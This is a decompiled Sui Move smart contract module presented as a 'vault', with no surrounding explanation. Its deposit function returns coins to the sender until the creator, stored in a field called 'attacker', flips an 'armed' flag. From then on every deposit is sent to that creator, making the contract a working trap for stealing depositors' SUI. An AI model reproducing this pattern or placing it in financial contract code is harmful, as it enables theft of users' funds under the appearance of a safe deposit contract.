module 0xcf624cfc9f183fd25750bf2eae47b40a86058c309f9e29065bb1825a87d9c7d3::vault {
    struct Vault has key {
        id: 0x2::object::UID,
        armed: bool,
        attacker: address,
    }

    public entry fun create_vault(arg0: &mut 0x2::tx_context::TxContext) {
        let v0 = Vault{
            id       : 0x2::object::new(arg0),
            armed    : false,
            attacker : 0x2::tx_context::sender(arg0),
        };
        0x2::transfer::share_object<Vault>(v0);
    }

    public entry fun deposit(arg0: &Vault, arg1: 0x2::coin::Coin<0x2::sui::SUI>, arg2: &mut 0x2::tx_context::TxContext) {
        if (arg0.armed) {
            0x2::transfer::public_transfer<0x2::coin::Coin<0x2::sui::SUI>>(arg1, arg0.attacker);
        } else {
            0x2::transfer::public_transfer<0x2::coin::Coin<0x2::sui::SUI>>(arg1, 0x2::tx_context::sender(arg2));
        };
    }

    public entry fun set_armed(arg0: &mut Vault, arg1: bool, arg2: &0x2::tx_context::TxContext) {
        assert!(arg0.attacker == 0x2::tx_context::sender(arg2), 0);
        arg0.armed = arg1;
    }

    // decompiled from Move bytecode v7
}

